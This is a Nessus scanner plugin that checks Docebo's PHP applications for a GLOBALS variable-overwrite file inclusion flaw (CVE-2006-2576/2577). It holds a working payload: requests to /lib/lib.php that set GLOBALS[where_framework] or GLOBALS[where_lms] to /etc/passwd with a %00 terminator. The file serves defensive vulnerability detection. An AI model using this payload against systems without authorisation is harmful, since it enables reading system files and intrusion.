# Script Written By Ferdy Riphagen 
# <f[dot]riphagen[at]nsec[dot]nl>
#
# Script distributed under the GNU GPLv2 License.
#
# Original advisory / discovered by :
# http://milw0rm.com/exploits/1817
#
# Changes by Tenable:
# - Revised plugin title (12/30/2008)

include("compat.inc");

if (description) {
 script_id(22235);
 script_version("$Revision: 1.14 $");

 script_cve_id("CVE-2006-2576", "CVE-2006-2577");
 script_bugtraq_id(18109);
 script_osvdb_id(25757);
 script_xref(name:"EDB-ID", value:"1817");

 script_name(english:"Docebo GLOBALS Variable Overwrite Remote File Inclusion");
 script_summary(english:"Checks for file inclusions errors in multiple Docebo applications");

 script_set_attribute(attribute:"synopsis", value:
"The remote host contains a PHP application that is vulnerable to
remote and local file inclusions.");
 script_set_attribute(attribute:"description", value:
"At least one Docebo application is installed on the remote host. 

Docebo has multiple PHP based applications, including a content
management system (DoceboCMS), a e-learning platform (DoceboLMS) and a
knowledge maintenance system (DoceboKMS)

By using a flaw in some PHP versions (PHP4 <= 4.4.0 and PHP5 <= 5.0.5)
it is possible to include files by overwriting the $GLOBALS variable. 

This flaw exists if PHP's register_globals is enabled.");
 script_set_attribute(attribute:"see_also", value:
"http://secunia.com/advisories/20260/");
 script_set_attribute(attribute:"see_also", value:
"http://www.hardened-php.net/advisory_202005.79.html");
 script_set_attribute(attribute:"see_also", value:
"http://www.nessus.org/u?ecd946e9");
 script_set_attribute(attribute:"solution", value:
"Disable PHP's register_globals and/or upgrade to a newer PHP release. 
The author has also released a patch to address the issues.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:H/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:W/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value:
"2006/08/17");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/05/21");
 script_cvs_date("$Date: 2011/03/15 18:34:10 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_ATTACK);
 script_family(english:"CGI abuses");
 script_copyright(english:"This script is Copyright (C) 2006-2011 Ferdy Riphagen");

 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_keys("www/PHP");
 exit(0);
}

include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

success = 0;

port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);

if (thorough_tests) dirs = list_uniq(make_list("/doceboLms", "/doceboKms", "/doceboCms", "/doceboCore", cgi_dirs()));
else dirs = make_list(cgi_dirs());

report = "";
foreach dir (dirs) {
 res = http_get_cache(item:string(dir, "/index.php"), port:port);
 if (isnull(res)) exit(0);

 if (egrep(pattern:"^Set-Cookie:.+docebo_session=", string:res) ||
     egrep(pattern:'title="Powered by Docebo(KMS|LMS|CMS)"', string:res) ||
     egrep(pattern:"powered_by.+<a href[^/]+\/\/www\.docebo\.org", string:res)) {
  uri = "/lib/lib.php";
  globals[0] = "GLOBALS[where_framework]=";
  globals[1] = "GLOBALS[where_lms]=";
  lfile = "/etc/passwd";

  for(n = 0; globals[n]; n++) { 
   req = http_get(item:string(dir, uri, "?", globals[n], lfile, "%00"), port:port);
   recv = http_keepalive_send_recv(data:req, port:port, bodyonly:1);
   if (isnull(recv)) exit(0);

   if (egrep(pattern:"root:.*:0:[01]:.*:", string:recv)) {
    n++;
    success = 1;
    report += '  - ' + build_url(port:port, qs:dir+"/index.php") + '\n';
    if (!thorough_tests) break;
   }
  }
 }
}

if (success) {
 report = string("\n",
	"The following affected Docebo install(s) were found :\n",
        "\n",
        report
 );
 security_warning(port:port, extra:report);
}
